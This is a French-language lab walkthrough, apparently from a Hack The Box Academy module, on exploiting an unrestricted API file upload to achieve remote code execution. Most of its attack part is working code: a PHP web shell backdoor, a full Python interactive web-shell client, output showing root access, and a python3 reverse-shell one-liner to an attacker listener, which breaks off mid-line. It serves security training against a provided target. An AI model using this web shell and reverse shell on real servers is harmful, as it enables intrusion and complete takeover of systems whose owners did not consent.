Upload arbitraire de fichiers
=====================================

* * * * *

L'Upload de fichiers arbitraires font partie des vulnérabilités les plus critiques. Ces failles permettent aux attaquants de télécharger des fichiers malveillants, d'exécuter des commandes arbitraires sur le serveur principal et même de prendre le contrôle de l'ensemble du serveur. Les vulnérabilités de téléchargement de fichiers arbitraires affectent aussi bien les applications Web que les API.

* * * * *

Upload de fichiers PHP via API vers RCE
-----------------------------------------------

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la.

Supposons que nous évaluons une application résidant dans `http://<TARGET IP>:3001`.

Lorsque nous parcourons l'application, une fonctionnalité de téléchargement de fichiers anonymes ressort. ![image](https://academy.hackthebox.com/storage/modules/160/2.png)

Créons le fichier ci-dessous (enregistrez-le sous `backdoor.php`) et essayez de le télécharger via la fonctionnalité disponible.

Code : php

```
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>

```

Ce qui précède nous permet d'ajouter le paramètre *cmd* à notre requête (à backdoor.php), qui sera exécutée à l'aide de *shell_exec()* . C'est si nous pouvons déterminer l'emplacement de *backdoor.php* , si *backdoor.php* sera rendu avec succès et si aucune restriction de fonction PHP n'existe.

![image](https://academy.hackthebox.com/storage/modules/160/4.png)

-   *backdoor.php* a été téléchargé avec succès via une requête POST vers `/api/upload/`. Une API semble gérer la fonctionnalité de téléchargement de fichiers de l'application.
-   Le type de contenu a été automatiquement défini sur `application/x-php`, ce qui signifie qu'aucune protection n'est en place. Le type de contenu serait probablement défini sur `application/octet-stream`ou `text/plain`s'il y en avait un.
-   Le téléchargement d'un fichier avec une extension *.php* est également autorisé. S'il y avait une limitation sur les extensions, nous pourrions essayer des extensions telles que `.jpg.php`, `.PHP`, etc.
-   Utiliser quelque chose comme [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php) pour identifier le code php en cours de téléchargement ne semble pas non plus en place.
-   Nous recevons également l'emplacement où notre fichier est stocké, `http://<TARGET IP>:3001/uploads/backdoor.php`.

Nous pouvons utiliser le script Python ci-dessous (enregistrez-le sous `web_shell.py`) pour obtenir un shell, en tirant parti du `backdoor.php`fichier téléchargé.

Code : Python

```
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")

```

Utilisez le script comme suit.

```
dsgsec@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ id
uid=0(root) gid=0(root) groups=0(root)

```

Pour obtenir un shell plus fonctionnel (inverse), exécutez ce qui suit à l'intérieur du shell obtenu via le script Python ci-dessus. Assurez-vous qu'un écouteur actif (tel que Netcat) est en place avant d'exécuter ce qui suit.

```
dsgsec@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adap
```
